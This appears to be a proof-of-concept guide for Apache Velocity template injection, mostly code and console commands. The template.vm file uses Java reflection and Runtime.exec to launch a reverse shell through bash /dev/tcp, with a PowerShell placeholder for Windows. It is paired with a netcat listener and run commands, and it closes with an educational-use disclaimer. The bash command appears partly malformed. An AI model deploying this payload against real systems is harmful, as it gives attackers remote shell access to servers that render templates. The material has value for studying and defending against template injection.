**Download Dependencies**
```console
user@hostname:~$ mkdir velocity-engine
user@hostname:~/velocity-engine$ wget https://dlcdn.apache.org/velocity/engine/2.3/velocity-engine-core-2.3.jar
user@hostname:~/velocity-engine$ wget https://dlcdn.apache.org/velocity/engine/2.3/velocity-engine-scripting-2.3.jar
user@hostname:~/velocity-engine$ wget https://dlcdn.apache.org/velocity/engine/2.3/spring-velocity-support-2.3.jar
user@hostname:~/velocity-engine$ wget https://repo1.maven.org/maven2/org/slf4j/slf4j-api/2.0.9/slf4j-api-2.0.9.jar
user@hostname:~/velocity-engine$ wget https://repo1.maven.org/maven2/org/apache/commons/commons-lang3/3.13.0/commons-lang3-3.13.0.jar
user@hostname:~/velocity-engine$ cd ..
user@hostname:~$
```

**File:** `RunVelocityTemplate.java`
```java
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;

import java.io.StringWriter;

public class RunVelocityTemplate {
    public static void main(String[] args) {
        Velocity.init();
        VelocityContext context = new VelocityContext();
        StringWriter writer = new StringWriter();
        Velocity.mergeTemplate("template.vm", "UTF-8", context, writer);
        System.out.println(writer.toString());
    }
}
```

**File:** `template.vm`
```velocity
#set($LHOST = '0.0.0.0')
#set($LPORT = 8899)
#set($s = "")
#set($class = $s.getClass())
#set($osName = $class.forName('java.lang.System').getProperty('os.name'))

#set($command = "")
#if($osName.toString().toLowerCase().contains("win"))
    #set($command = "cmd.exe /c POWERSHELL_SCRIPT")
#else
    #set($command = "bash -c $@|bash 0 echo sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1")
#end

$class.forName("java.lang.Runtime").getRuntime().exec($command)
```

**Start Listener**
```console
user@hostname:~$ nc -lvnp 8899
Listening on 0.0.0.0 8899
```

**Test**

```console
user@hostname:~$ javac -cp 'velocity-engine/*' RunVelocityTemplate.java && java -cp 'velocity-engine/*:.' RunVelocityTemplate
```
**Reference**

- https://velocity.apache.org/engine/2.2/developer-guide.html

**Disclaimer**
---
_This code and associated instructions are provided for educational purposes only. Unauthorized use for malicious intent, including but not limited to unauthorized access to computer systems, networks, or data, is strictly prohibited. The author disclaims any responsibility for misuse of the code or any negative consequences resulting from its use. Users are advised to adhere to ethical and legal standards when utilizing or experimenting with the provided code. It is recommended to obtain explicit permission before attempting to run this code on any systems or networks that are not owned or managed by the user._
